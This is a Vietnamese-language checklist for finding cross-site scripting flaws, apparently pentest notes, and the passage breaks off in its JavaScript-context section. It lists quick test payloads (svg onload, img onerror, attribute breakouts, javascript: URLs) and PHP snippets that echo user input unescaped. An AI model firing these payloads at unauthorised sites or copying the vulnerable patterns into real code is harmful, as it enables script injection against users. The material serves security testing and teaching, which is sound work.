# CHECKLIST
- Tìm mọi nơi có input → xuất hiện lại trên UI:
  - Query string, form, search box, comment, profile, upload, redirect `?next=`, `?url=`,..
- Với mỗi input, cố gắng tìm:
  - Nó được render ở đâu? (HTML, thuộc tính, trong JS, trong URL…)
  - Có được lưu không? (stored XSS)
  - Có flow vào admin / staff / internal panel không? (blind XSS)
- Payload test nhanh (tùy context chỉnh lại):
  - `"><svg/onload=alert(1)>`
  - `<img src=x onerror=alert(1)>`
  - `"><script>alert(1)</script>`
  - `${alert(1)}`
  - `javascript:alert(1)`

## 1. HTML context 
- Input chui vào giữa các tag:
  `<div>Hello, <?= $_GET['name'] ?></div>`
- Hoặc trong template:
  `<div className={userInput}>`
- Checklist tấn công:
  - Thoát khỏi attribute
    - Payload: `" autofocus onfocus=alert(1) x="`
    - Hoặc: `" onmouseover=alert(1) "`
  - Nếu attribute không có quote:
    `<div class=<?= $clazz ?>>`
    -> Payload: `x onmouseover=alert(1)` (khoảng trắng tách attribute)
  - Thử inject thẻ mới: `"><svg/onload=alert(1)>`
  - Các attribute nhạy cảm: `src`, `href`, `data-xxx`, `style`, event `on*`

## Javascript context:
- Input xuất hiện trong `<script>`:
  ``` javascript
  <script>
  const name = "<?= $_GET['name'] ?>";
  </script>
```
